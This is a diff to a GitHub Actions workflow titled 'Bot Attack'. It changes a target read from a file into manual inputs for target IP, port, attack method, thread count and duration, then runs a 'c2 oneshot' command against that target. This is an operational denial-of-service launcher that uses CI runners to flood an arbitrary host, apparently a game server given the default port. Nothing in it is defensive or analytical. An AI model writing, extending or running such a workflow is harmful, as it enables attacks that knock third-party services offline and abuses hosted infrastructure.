@@ -1,10 +1,28 @@
 name: Bot Attack
 
 on:
-  push:
-    paths:
-      - 'attack.txt'
   workflow_dispatch:
+    inputs:
+      target:
+        description: 'Target IP'
+        required: true
+        default: '1.2.3.4'
+      port:
+        description: 'Port'
+        required: true
+        default: '30120'
+      method:
+        description: 'Method'
+        required: true
+        default: 'timeout'
+      threads:
+        description: 'Threads'
+        required: true
+        default: '500'
+      duration:
+        description: 'Duration (s)'
+        required: true
+        default: '300'
 
 jobs:
   attack:
@@ -28,5 +46,4 @@ jobs:
 
       - name: Attack
         run: |
-          TARGET=$(cat attack.txt)
-          ./c2 oneshot $TARGET
+          ./c2 oneshot ${{ github.event.inputs.target }} ${{ github.event.inputs.port }} ${{ github.event.inputs.method }} ${{ github.event.inputs.threads }} ${{ github.event.inputs.duration }}
